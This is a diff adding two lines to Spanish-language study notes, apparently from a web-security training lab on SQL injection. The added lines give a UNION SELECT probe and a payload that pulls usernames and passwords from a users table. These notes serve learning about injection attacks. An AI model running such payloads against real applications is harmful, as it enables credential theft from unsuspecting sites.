@@ -11,3 +11,6 @@ carlos~montoya
 ...
 
 Diferentes bases de datos tienen diferente sintaxis para concatenar la cadena.
+
+EN el lab hay : ' UNION SELECT NULL,'a'--
+Entonces la respuesta es : ' UNION SELECT NULL,username ||'~'|| password FROM users--
